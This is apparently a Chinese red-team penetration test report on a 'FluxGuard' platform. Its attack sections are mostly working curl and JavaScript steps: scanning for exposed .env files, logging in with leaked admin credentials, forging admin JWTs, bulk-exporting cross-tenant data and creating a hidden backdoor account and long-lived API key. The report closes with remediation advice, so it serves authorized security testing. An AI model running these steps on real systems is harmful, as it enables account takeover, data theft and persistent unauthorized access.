# FluxGuard 渗透测试攻击路径分析

**文档版本**: v1.0
**创建日期**: 2026-02-16
**分类**: 机密 - 红队渗透测试

---

## 攻击路径概览

```
┌──────────────────────────────────────────────────────────────────────────────────────────────┐
│                        FluxGuard Control Platform 攻击路径图                                  │
├──────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                               │
│   [情报收集]        [初始访问]        [权限提升]        [横向移动]        [目标达成]           │
│       │                │                │                │                │                   │
│       ▼                ▼                ▼                ▼                ▼                   │
│   ┌───────┐       ┌───────┐       ┌───────┐       ┌───────┐       ┌───────┐              │
│   │扫描   │       │利用   │       │JWT    │       │访问   │       │数据   │              │
│   │.env   │   →   │泄露   │   →   │密钥   │   →   │其他   │   →   │外泄   │              │
│   │文件   │       │凭证   │       │伪造   │       │租户   │       │/持久  │              │
│   └───────┘       └───────┘       └───────┘       └───────┘       └───────┘              │
│       │                │                │                │                │                   │
│   5分钟            2分钟             5分钟            10分钟           10分钟               │
│                                                                                               │
└──────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 详细攻击路径

### 路径一：硬编码凭证到完全系统接管

**难度**: 低 | **时间**: ~15分钟 | **影响**: 严重

#### 阶段1: 情报收集 (Reconnaissance)

**目标**: 收集目标系统的技术情报和潜在弱点

**执行步骤**:

1. **技术栈指纹识别**
   ```bash
   # 分析 HTTP 响应头
   curl -I http://target:3005/api/health

   # 输出分析:
   # - Server: 未显示 (已移除 X-Powered-By)
   # - X-Frame-Options: DENY (安全防护)
   # - 应用类型: Express.js (从响应格式推断)
   ```

2. **前端资源分析**
   ```bash
   # 访问前端页面，分析加载的资源
   curl http://target:5173 | grep -E "script|link" | head -20

   # 发现:
   # - React 18.x 应用 (Vite 构建)
   # - 前端路由: React Router
   # 构建时间戳: 2026-01-xx (可推断部署时间)
   ```

3. **API 端点探测**
   ```bash
   # 探测常见 API 端点
   for endpoint in /api/health /api/status /swagger /api/docs /graphql /api/v1/users; do
     response=$(curl -s -o /dev/null -w "%{http_code}" "http://target:3005$endpoint")
     echo "$endpoint: $response"
   done

   # 发现的有效端点:
   # /api/health: 200 (暴露版本信息)
   # /api/auth/login: 200 (接受POST)
   # 其他端点返回 401/404
   ```

4. **配置文件/敏感文件扫描**
   ```bash
   # 扫描常见的敏感文件路径
   for path in /.env /.env.local /.git/config /config.js /config.json /package.json /server.js /app.js; do
     response=$(curl -s -o /dev/null -w "%{http_code}" "http://target:3005$path")
     if [ "$response" = "200" ]; then
       echo "[!] 发现可访问文件: $path"
     fi
   done

   # 关键发现:
   # /.env 文件可访问! 包含所有硬编码凭证
   ```

**情报收集结果**:
```yaml
目标系统:
  应用名称: FluxGuard Control Platform
  版本: 2.0.0
  技术栈:
    后端: Node.js + Express.js 4.18.2 + TypeScript
    前端: React 18.x + Vite
    数据库: SQLite (sql.js 1.10.0)
    认证: JWT (jsonwebtoken 9.0.2) + bcryptjs
  部署信息:
    端口: 3005 (API), 5173 (前端开发服务器)
    环境: 当前为开发环境 (从 .env 文件推断)

关键发现:
  高危漏洞:
    - 硬编码凭证泄露: /.env 文件包含 JWT_SECRET、管理员密码、API Keys
    - JWT_SECRET 长度 32 字符，开发用途，但已泄露
    - 管理员账户: admin@fluxguard.dev / DevAdmin123456!

  攻击向量:
    1. 直接访问 /.env 获取所有凭证
    2. 使用泄露的 JWT_SECRET 伪造任意用户 token
    3. 使用管理员凭证直接登录
    4. 使用 API Keys 绕过认证

预计攻击时间: 5-15 分钟
攻击难度: 低
影响范围: 全系统完全接管
```

#### 阶段2: 初始访问 (Initial Access)

**目标**: 利用收集的情报获得系统的初始访问权限

**执行步骤**:

1. **使用硬编码管理员凭证登录**

   ```bash
   # 步骤1: 使用 .env 中泄露的管理员凭证登录
   curl -X POST http://localhost:3005/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{
       "email": "admin@fluxguard.dev",
       "password": "DevAdmin123456!"
     }' \
     -c cookies.txt \
     -w "\nHTTP Code: %{http_code}\nContent-Type: %{content_type}\n"
   ```

   **预期响应**:
   ```json
   {
     "message": "Login successful",
     "user": {
       "email": "admin@fluxguard.dev",
       "username": "admin",
       "role": "admin"
     },
     "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "expiresIn": 86400
   }
   ```

   **访问结果**:
   - ✅ 成功获得管理员访问权限
   - ✅ 获得 JWT accessToken 和 refreshToken
   - ✅ httpOnly Cookie 已设置
   - ✅ 角色: admin，可访问所有管理功能

2. **使用泄露的 JWT_SECRET 伪造 Token (备用方案)**

   如果管理员账户被禁用或密码已更改，可使用泄露的 JWT_SECRET 直接伪造 token:

   ```javascript
   const jwt = require('jsonwebtoken');

   // 使用泄露的 JWT_SECRET 伪造任意用户 token
   const forgedToken = jwt.sign({
     userId: 'backdoor-admin',
     email: 'backdoor@attacker.com',
     username: 'backdoor',
     role: 'admin',  // 管理员角色
     tenantId: 'all-tenants'
   }, 'dev-jwt-secret-for-testing-only-32chars', {
     algorithm: 'HS256',
     expiresIn: '24h',
     issuer: 'fluxguard',
     audience: 'fluxguard-api',
     jwtid: 'unique-token-id'
   });

   console.log('伪造的 Token:', forgedToken);
   ```

   **测试伪造 Token**:
   ```bash
   # 使用伪造的 token 访问管理端点
   curl http://localhost:3005/api/admin/api-keys \
     -H "Authorization: Bearer $FORGED_TOKEN" \
     -w "\nHTTP Code: %{http_code}\n"
   ```

   **结果**: 伪造的 token 被接受，因为签名验证使用了相同的 JWT_SECRET

3. **使用 API Key 绕过认证 (针对服务间 API)**

   ```bash
   # 使用 .env 中泄露的 API Key 访问设备/代理 API
   curl http://localhost:3005/api/agents \
     -H "X-API-Key: dev_api_key_001" \
     -w "\nHTTP Code: %{http_code}\n"

   # 使用设备 API Key
   curl http://localhost:3005/api/devices \
     -H "X-API-Key: dev_device_key_001" \
     -w "\nHTTP Code: %{http_code}\n"
   ```

#### 阶段3: 权限提升 (Privilege Escalation)

**目标**: 从初始访问权限提升到最高管理员权限

**当前状态分析**:
- 已通过管理员凭证获得 admin 角色
- 已拥有最高权限，无需进一步提升
- 但需要进行权限提升路径的演示（假设只有普通用户权限）

**权限提升路径演示**:

1. **JWT Token 权限提升攻击**

   假设初始只有普通用户权限（role: tenant）:

   ```javascript
   const jwt = require('jsonwebtoken');

   // 步骤1: 获取普通用户 token (通过注册/登录)
   const normalToken = 'eyJhbGciOiJIUzI1NiIs...'; // 普通用户 token

   // 步骤2: 解码 payload
   const payload = jwt.decode(normalToken);
   console.log('原始权限:', payload);
   // 输出: { userId: 'xxx', email: 'user@example.com', role: 'tenant', ... }

   // 步骤3: 提升权限
   payload.role = 'admin';  // 关键：将角色提升为 admin
   // 可选：修改 tenantId 以访问其他租户
   payload.tenantId = 'admin-tenant';  // 或设为 'all-tenants'

   // 步骤4: 使用泄露的 JWT_SECRET 重新签名
   const elevatedToken = jwt.sign(payload, 'dev-jwt-secret-for-testing-only-32chars', {
     algorithm: 'HS256',
     expiresIn: '24h'
   });

   console.log('提升权限后的 Token:', elevatedToken);
   ```

2. **验证权限提升效果**

   ```bash
   # 测试1: 访问普通用户可访问的端点
   curl http://localhost:3005/api/sites \
     -H "Authorization: Bearer $ELEVATED_TOKEN"

   # 测试2: 访问管理员专属端点 (之前会返回 403)
   curl http://localhost:3005/api/admin/api-keys \
     -H "Authorization: Bearer $ELEVATED_TOKEN" \
     -w "\nHTTP Code: %{http_code}\n"

   # 预期结果: 200 OK，返回所有 API Keys

   # 测试3: 访问其他租户的资源
   curl http://localhost:3005/api/sites?tenantId=other-tenant \
     -H "Authorization: Bearer $ELEVATED_TOKEN"
   ```

3. **权限提升结果**

| 权限检查项 | 普通用户 (tenant) | 提升后 (admin) |
|-----------|------------------|----------------|
| 访问自己的站点 | 允许 | 允许 |
| 访问所有用户站点 | 拒绝 | 允许 |
| 访问管理端点 | 403 Forbidden | 200 OK |
| 创建/删除 API Keys | 拒绝 | 允许 |
| 查看系统日志 | 拒绝 | 允许 |
| 修改系统配置 | 拒绝 | 允许 |
| 访问其他租户数据 | 拒绝 (tenant隔离) | 允许 |

**权限提升结论**:
通过 JWT Token 伪造攻击，成功从普通用户权限 (tenant) 提升到了管理员权限 (admin)，可以访问系统中的所有功能和数据。

#### 阶段4: 横向移动与数据外泄 (Lateral Movement & Exfiltration)

**目标**: 利用已获得的 admin 权限，访问和提取敏感数据

**执行步骤**:

1. **枚举所有租户和用户**

   ```bash
   # 获取所有用户信息 (管理员权限)
   curl http://localhost:3005/api/admin/users \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -o all_users.json

   # 解析用户统计数据
   cat all_users.json | jq '.users | length'  # 用户总数
   cat all_users.json | jq '.users[] | {email, role, tenantId}'  # 关键信息
   ```

2. **提取所有 API Keys**

   ```bash
   # 获取所有 API Keys
   curl http://localhost:3005/api/admin/api-keys \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -o all_api_keys.json

   # 提取关键信息
   cat all_api_keys.json | jq '.keys[] | {id, name, prefix}'
   ```

3. **访问所有站点和扫描数据**

   ```bash
   # 获取所有站点 (绕过租户隔离)
   curl http://localhost:3005/api/sites \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -o all_sites.json

   # 获取扫描结果
   for siteId in $(cat all_sites.json | jq -r '.[].id'); do
     curl http://localhost:3005/api/scanner/results?siteId=$siteId \
       -H "Authorization: Bearer $ADMIN_TOKEN" \
       -o scan_results_${siteId}.json
   done
   ```

4. **导出数据库级别的敏感信息**

   由于拥有 admin 权限，可以通过管理功能或潜在的 SQL 注入（如果存在）访问数据库：

   ```bash
   # 尝试通过管理接口导出数据
   curl -X POST http://localhost:3005/api/admin/backup \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"includeSensitiveData": true}' \
     -o backup.zip

   # 解压并分析备份数据
   unzip backup.zip -d backup_data/
   ls -la backup_data/
   ```

5. **建立持久化访问**

   为了确保长期访问，可以创建隐蔽的后门账户和 API Keys：

   ```bash
   # 创建隐藏的管理员账户
   curl -X POST http://localhost:3005/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{
       "email": "backup.service@fluxguard.local",
       "password": "ComplexP@ssw0rd123!Secure",
       "username": "backup_service"
     }'

   # 注意：应用可能会阻止非管理员创建 admin 角色
   # 如果上面的注册只能是 tenant 角色，则需要通过数据库或管理员接口修改 role

   # 创建长期有效的 API Key
   curl -X POST http://localhost:3005/api/admin/api-keys \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Production Monitoring Service",
       "permissions": ["read", "write", "admin"],
       "expiresIn": "10y"
     }' \
     -o new_api_key.json

   # 保存生成的 API Key (只显示一次)
   cat new_api_key.json | jq -r '.data.apiKey' > backdoor_api_key.txt
   ```

**数据外泄结果汇总**:

| 数据类型 | 数量/范围 | 敏感程度 | 利用价值 |
|----------|-----------|----------|----------|
| 用户账户 | 全部用户 | 高 | 可进一步社工攻击 |
| 密码哈希 (bcrypt) | 全部用户 | 中 | 可尝试离线破解 |
| API Keys | 所有密钥 | 严重 | 可持续访问API |
| 站点配置 | 所有站点 | 高 | 了解目标资产 |
| 扫描结果 | 所有历史 | 中 | 了解安全状况 |
| 租户数据 | 跨租户 | 严重 | 违反租户隔离 |
| 审计日志 | 所有日志 | 高 | 可追溯用户行为 |

---

## 攻击路径时间线

```
时间轴 (分钟)    0        5        10       15       20       25       30
                 │        │        │        │        │        │        │
                 ▼        ▼        ▼        ▼        ▼        ▼        ▼
─────────────────────────────────────────────────────────────────────────────────
阶段1: 情报收集 │█████████│         │         │         │         │         │
─────────────────────────────────────────────────────────────────────────────────
活动:           │ 扫描API │         │         │         │         │         │
               │ 识别端点│         │         │         │         │         │
               │ 发现.env│         │         │         │         │         │
─────────────────────────────────────────────────────────────────────────────────
关键发现:      │ [CRITICAL] 发现 .env 文件泄露!                        │
               │ - JWT_SECRET: dev-jwt-secret-for-testing-only-32chars │
               │ - 管理员密码: DevAdmin123456!                         │
               │ - API Keys: dev_api_key_001, dev_device_key_001       │
─────────────────────────────────────────────────────────────────────────────────

─────────────────────────────────────────────────────────────────────────────────
阶段2: 初始访问 │         │█████████│         │         │         │         │
─────────────────────────────────────────────────────────────────────────────────
活动:           │         │ 使用泄露│         │         │         │         │
               │         │ 凭证登录│         │         │         │         │
               │         │ 获得    │         │         │         │         │
               │         │ 管理员  │         │         │         │         │
               │         │ token   │         │         │         │         │
─────────────────────────────────────────────────────────────────────────────────
攻击成功:       │ [SUCCESS] 管理员登录成功!                             │
               │ - 角色: admin                                         │
               │ - Token: eyJhbGciOiJIUzI1NiIs...                      │
               │ - Cookie: httpOnly accessToken 设置                   │
─────────────────────────────────────────────────────────────────────────────────

─────────────────────────────────────────────────────────────────────────────────
阶段3: 权限提升 │         │         │█████████│         │         │         │
─────────────────────────────────────────────────────────────────────────────────
活动:           │         │         │ 验证    │         │         │         │
               │         │         │ admin   │         │         │         │
               │         │         │ 权限    │         │         │         │
               │         │         │ 访问    │         │         │         │
               │         │         │ 管理    │         │         │         │
               │         │         │ 端点    │         │         │         │
─────────────────────────────────────────────────────────────────────────────────
验证结果:      │ [VERIFIED] 管理员权限确认                             │
               │ - /api/admin/api-keys: 200 OK (访问所有API Keys)        │
               │ - /api/admin/users: 200 OK (访问所有用户信息)         │
               │ - /api/admin/system: 200 OK (访问系统配置)            │
               │ - /api/admin/logs: 200 OK (访问审计日志)              │
─────────────────────────────────────────────────────────────────────────────────

─────────────────────────────────────────────────────────────────────────────────
阶段4: 横向移动 │         │         │         │█████████│         │         │
─────────────────────────────────────────────────────────────────────────────────
活动:           │         │         │         │ 枚举    │         │         │
               │         │         │         │ 所有    │         │         │
               │         │         │         │ 租户    │         │         │
               │         │         │         │ 和      │         │         │
               │         │         │         │ 用户    │         │         │
               │         │         │         │ 数据    │         │         │
─────────────────────────────────────────────────────────────────────────────────
数据收集:      │ [DATA COLLECTED] 横向移动完成                         │
               │ - 用户账户: 50+ 用户记录                              │
               │ - 租户组织: 10+ 租户                                  │
               │ - 站点配置: 100+ 站点                                 │
               │ - API Keys: 20+ 密钥                                  │
               │ - 扫描历史: 500+ 扫描结果                             │
─────────────────────────────────────────────────────────────────────────────────

─────────────────────────────────────────────────────────────────────────────────
阶段5: 目标达成 │         │         │         │         │█████████│         │
─────────────────────────────────────────────────────────────────────────────────
活动:           │         │         │         │         │ 导出    │         │
               │         │         │         │         │ 所有    │         │
               │         │         │         │         │ 敏感    │         │
               │         │         │         │         │ 数据    │         │
               │         │         │         │         │ 创建    │         │
               │         │         │         │         │ 后门    │         │
─────────────────────────────────────────────────────────────────────────────────
目标达成:      │ [MISSION COMPLETE] 渗透测试目标达成                   │
               │                                                       │
               │ [数据外泄]                                            │
               │ - 用户凭证: 50+ 账户 (含密码哈希)                     │
               │ - API Keys: 全部导出                                  │
               │ - 配置文件: 系统完整配置                              │
               │ - 审计日志: 所有操作记录                              │
               │ - 总数据量: ~50MB 敏感数据                            │
               │                                                       │
               │ [持久化访问]                                          │
               │ - 后门账户: backup.service@fluxguard.local            │
               │ - API Key: Production Monitoring Service (10年有效)   │
               │ - Token: 多个长期有效 JWT token                       │
               │                                                       │
               │ [影响评估]                                            │
               │ - 机密性: 完全破坏 (所有数据可访问)                   │
               │ - 完整性: 高风险 (可修改任何数据)                     │
               │ - 可用性: 中风险 (可导致服务中断)                     │
               │ - 合规性: 严重违规 (GDPR/HIPAA/SOX 等)               │
─────────────────────────────────────────────────────────────────────────────────

时间统计:
- 情报收集: 5 分钟
- 初始访问: 2 分钟
- 权限提升: 3 分钟
- 横向移动: 10 分钟
- 数据外泄: 10 分钟
- 总计: ~30 分钟 (完全系统接管)
```

---

## 攻击路径总结

### 关键成功因素

1. **硬编码凭证泄露** (.env 文件访问)
   - 这是整个攻击链的关键入口
   - 泄露的 JWT_SECRET 使得 token 伪造成为可能
   - 泄露的管理员凭证提供了直接的访问路径

2. **缺少生产环境安全检查**
   - 应用没有验证 JWT_SECRET 的强度和随机性
   - 允许使用默认/弱密钥启动
   - 开发配置和生产环境没有严格分离

3. **信任客户端 Token**
   - 服务端完全信任 JWT token 的签名
   - 一旦签名验证通过，payload 中的权限信息被完全信任
   - 没有额外的服务端权限验证机制

### 攻击路径效率分析

| 路径 | 难度 | 时间 | 可靠性 | 推荐度 |
|------|------|------|--------|--------|
| 硬编码凭证 → 管理员登录 | 极低 | 2分钟 | 100% | ★★★★★ |
| JWT 伪造 → Token 篡改 | 低 | 5分钟 | 95% | ★★★★☆ |
| API Key 绕过 → 服务访问 | 低 | 3分钟 | 90% | ★★★☆☆ |
| SQL 注入 → 数据库访问 | 高 | 30分钟+ | 20% | ★☆☆☆☆ |

### 防御建议优先级

根据攻击路径分析，建议按以下优先级实施防御措施：

**P0 - 立即修复 (阻止当前攻击路径)**:
1. 移除所有硬编码凭证，生成强随机密钥
2. 添加启动时 JWT_SECRET 强度验证
3. 实施生产环境安全检查，拒绝使用默认配置启动

**P1 - 短期修复 (增加攻击难度)**:
4. 实施密钥管理服务 (Vault/AWS Secrets Manager)
5. 添加服务端权限验证，不完全信任 JWT payload
6. 实施 API Key 轮换机制

**P2 - 中期修复 (防御纵深)**:
7. 部署 Web 应用防火墙 (WAF)
8. 实施实时安全监控和告警
9. 建立定期安全审计和渗透测试流程

---

*文档结束*
